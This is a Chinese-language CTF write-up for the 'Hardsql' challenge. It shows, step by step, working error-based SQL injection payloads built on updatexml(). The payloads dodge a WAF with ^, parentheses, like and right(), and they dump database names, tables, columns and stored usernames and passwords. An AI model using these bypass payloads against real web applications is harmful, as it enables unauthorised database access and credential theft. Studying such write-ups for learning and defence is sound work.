# Hardsql
## 考察知识点：
### 1.报错注入
### 2.bypass能力
### 3.过滤关键字替换

题目提示报错注入，登陆框输入admin'&password'

![image](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/第十届极客大赛（成信大）/images/07DFC29872DC41DDA97FBD60C034F91FHardsql1.png)

自己本地sql语句测试：

![image](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/第十届极客大赛（成信大）/images/371EC467CF8141B0A91DC61ED9FFC3A2Hardsql2.png)

所以推测后台sql查询语句为：`username='admin' and password='password'`

## 测试过滤那些符号：
### 1.页面三种返回，报错，密码错误，和警告语句（你可别被我逮住了，臭弟弟）
### 2.推测警告语句即被waf检测了


![image](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/第十届极客大赛（成信大）/images/623271FC1D234D09A9E9DCE971E6430BHardsql3.png)

发现过滤了：and及其替换符号，union,但是updatexml没有过滤，and还可以使用^来代替

payload:`?username=admin&password=pass'^updatexml(1,concat(0x7e,(select database()),0x7e),1)`

发现还是被waf拦截：

payload:`?username=admin&password=pass'^updatexml(1,concat(0x7e,(select( database())),0x7e),1)`

![image](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/第十届极客大赛（成信大）/images/2DDAA2DEB6AC4F59B5892C7388225C3CHardsql4.png)

爆出数据库，说明空格也被拦截了。此处使用（）来绕过空格限制

#### 爆库：

`?username=admin&password=pass'^updatexml(1,concat(0x7e,(select(SELECT(group_concat(schema_name))from(information_schema.SCHEMATA))),0x7e),1)`

![image](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/第十届极客大赛（成信大）/images/692EB09956304BBF8D51D23711F85767Hardsql5.png)

但是updataxml()有长度限制，只显示32位，此时可使用substr()函数来截断显示，但是被过滤了...然后想到还可以使用right()来让返回数据从右边开始显示

paylaod:`?username=admin&password=pass'^updatexml(1,concat(0x7e,right((select(SELECT(group_concat(schema_name))from(information_schema.SCHEMATA))),30),0x7e),1)%23`

![image](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/第十届极客大赛（成信大）/images/1791E1E0D39647359B5BEDC0235D163FHardsql6.png)

后面的数据库名也被爆了出来，此时重点关注geek数据库

#### 爆表
payload:
`username=admin&password=pass'^updatexml(1,concat(0x7e,right((select(SELECT(group_concat(table_name))from(information_schema.tables)where(table_schema)like'geek')),30),0x7e),1)%23`

=等号被过滤了，这里可以使用like来绕过

![image](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/第十届极客大赛（成信大）/images/D5AB3B6F46164BDEA8BC6402C855E88BHardsql7.png)

#### 爆字段
payload:
`username=admin&password=pass'^updatexml(1,concat(0x7e,right((select(SELECT(group_concat(column_name))from(information_schema.columns)where(table_name)like'H4rDsq1')),30),0x7e),1)%23`

![image](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/第十届极客大赛（成信大）/images/13FE09DBFDA84D3F87EA50E830120B01Hardsql8.png)

#### 爆字段数据
payload:
`username=admin&password=pass'^updatexml(1,concat(0x7e,right((select(SELECT(group_concat(username,password))from(H4rDsq1))),30),0x7e),1)%23`

![image](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/第十届极客大赛（成信大）/images/6654676ABACC48CC89C8B772F43FE931Hardsql9.png)